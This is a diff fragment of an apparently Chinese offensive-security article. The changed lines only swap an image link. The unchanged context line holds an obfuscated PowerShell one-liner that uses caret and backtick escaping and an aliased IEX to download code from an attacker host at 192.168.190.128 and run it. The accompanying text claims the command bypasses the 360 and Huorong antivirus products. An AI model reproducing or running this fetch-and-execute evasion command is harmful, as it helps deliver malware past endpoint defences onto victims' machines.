@@ -92,7 +92,7 @@ Powershell:
     cmd /c echo set-alias -name xz -value IEX;x^z (New-Object "Ne`T.WeB`ClienT").d^o^w^n^l^o^a^d^s^t^r^i^n^g('ht'+'tP://19’+'2.168.190.12'+'8/a') | p^o^w^e^r^s^h^e^l^l -  
     
 
-![](https://gitee.com/fuli009/images/raw/master/public/20210908145431.png)直接起飞，`360
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210908145431.png)直接起飞，`360
 && 火绒` 直接绕过执行命令
 
 ## 0x06 结尾
